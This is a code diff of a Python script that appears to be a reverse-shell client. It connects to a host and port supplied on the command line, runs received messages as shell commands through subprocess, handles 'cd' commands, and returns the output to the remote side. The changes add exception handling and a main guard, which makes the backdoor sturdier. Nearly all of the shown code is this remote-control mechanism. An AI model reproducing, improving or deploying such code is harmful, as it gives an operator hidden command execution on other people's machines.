@@ -16,7 +16,8 @@ def inbound_message():
             sock.close()
             print('[+] Keyboard interrupt issued')
             break
-        except Exception:
+        except Exception as e:
+            print(e)
             sock.close()
             break
 
@@ -43,11 +44,17 @@ def session_handler():
             break
         # Change directory script
         elif message.split(" ")[0] == 'cd':
-            directory = str(message.split(" ")[1])
-            os.chdir(directory)
-            cur_dir = os.getcwd()
-            print(f'[+] Changed to {cur_dir}')
-            outbound_message(cur_dir)
+            try:
+                directory = str(message.split(" ")[1])
+                os.chdir(directory)
+                cur_dir = os.getcwd()
+                print(f'[+] Changed to {cur_dir}')
+                outbound_message(cur_dir)
+            except FileNotFoundError:
+                outbound_message('Invalid directory. Try again.')
+                continue
+            except IndexError:
+                outbound_message('Argument missing. Try again.')
 
         # Subprocess command handling
         else:
@@ -57,7 +64,13 @@ def session_handler():
             outbound_message(output.decode())
 
 
-sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-host_ip = sys.argv[1]
-host_port = int(sys.argv[2])
-session_handler()
+if __name__ == '__main__':
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    try:
+        host_ip = sys.argv[1]
+        host_port = int(sys.argv[2])
+        session_handler()
+    except IndexError:
+        print('[-] Argumet(s) missing.')
+    except Exception as e:
+        print(e)
